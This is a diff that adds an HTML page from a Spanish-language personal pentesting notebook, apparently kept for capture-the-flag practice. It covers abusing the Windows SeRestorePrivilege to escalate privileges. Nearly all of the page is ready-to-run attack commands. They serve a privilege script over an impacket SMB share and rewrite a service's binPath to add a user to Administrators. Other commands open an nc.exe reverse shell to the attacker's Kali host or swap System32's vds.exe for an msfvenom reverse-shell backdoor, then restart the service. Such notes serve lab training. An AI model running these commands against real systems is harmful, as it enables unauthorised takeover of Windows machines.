@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Restore | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="restore">
+          <div class="note-tabbar">
+            <span>Restore</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Privilegios</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / privilegios</p>
+            <h2>Restore</h2>
+
+            <aside class="callout">
+              <p><strong>Restore</strong> Permite acceso de escritura a <code>System32</code> y reemplazar cualquier fichero de servicio</p>
+            </aside>
+
+            <h2>Habilitar Privilegio</h2>
+
+            <p><a href="https://daniel10barredo.github.io/PrivEscAssist_Windows/tools/EnableSeRestorePrivilege.ps1">EnableSeRestorePrivilege.ps1</a>: Habilitar Privilegio en caso de estar deshabilitado</p>
+
+            <section class="code-card">
+              <h3>Habilitar SeRestorePrivilege en caso de estar deshabilitado</h3>
+              <pre><code># Kali: SMB Server en el directorio de EnableSeRestore.ps1
+impacket-smbserver recurso $(pwd) -smb2support
+# Windows: Habilitar RestorePrivilege
+\\&lt;kali_ip&gt;\recurso\EnableSeRestorePrivilege.ps1</code></pre>
+            </section>
+
+            <h2>Buscar Servicios</h2>
+
+            <section class="code-card">
+              <h3>CMD: Buscar Servicios Privilegiados -&gt; SERVICE_START_NAME: LocalSystem</h3>
+              <pre><code># Listar Servicios
+services # PowerShell
+wmic service list brief # CMD
+# Información sobre un servicio
+sc.exe qc &lt;service_name&gt;</code></pre>
+            </section>
+
+            <h2>Editar Path</h2>
+
+            <section class="code-card">
+              <h3>CMD: Editar BINARY_PATH_NAME para ejecutar un comando</h3>
+              <pre><code># Payload 1: Agregar nuestro usuario a administrators.
+# A veces hay que coger username completo del comando whoami Ej. &lt;hostname&gt;\&lt;username&gt;
+sc.exe config &lt;service_name&gt; binPath= &quot;cmd /c net localgroup Administrators &lt;username&gt; /add&quot;
+
+# Payload 2: Subir nc.exe y mandarnos rev_shell a un listener
+sc.exe config &lt;service_name&gt; binPath= &quot;C:\Users\&lt;user&gt;\nc.exe -e cmd &lt;kali_ip&gt; 443&quot;
+rlwrap nc 443
+
+# Payload 3: Sustituir binario de BinaryPath C:\Windows\System32\vds.exe -&gt; backdoor.exe
+# Kali
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; backdoor.exe
+rlwrap nc 443
+# PowerShell
+mv C:\Windows\System32\vds.exe C:\Windows\System32\vds.back
+mv backdoor.exe C:\Windows\System32\vds.exe</code></pre>
+            </section>
+
+            <h2>Reiniciar Servicio</h2>
+
+            <section class="code-card">
+              <h3>CMD: Reiniciar el servicio. Se debe producir un fallo al reiniciar</h3>
+              <pre><code>sc.exe stop &lt;service_name&gt;
+net stop &lt;service_name&gt; # Alternativa
+sc.exe start &lt;service_name&gt;
+net start &lt;service_name&gt; # Alternativa</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>CMD: Confirmar ADMINS</h3>
+              <pre><code>net localgroup Administrators
+# Si somos del grupo Administrators pero no tenemos aún privilegios reinicia la shell
+# Si el payload depende de una rev_shell -&gt; Kali: Listener</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=return">Return</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>privilegios</span>
+              <span>restore</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
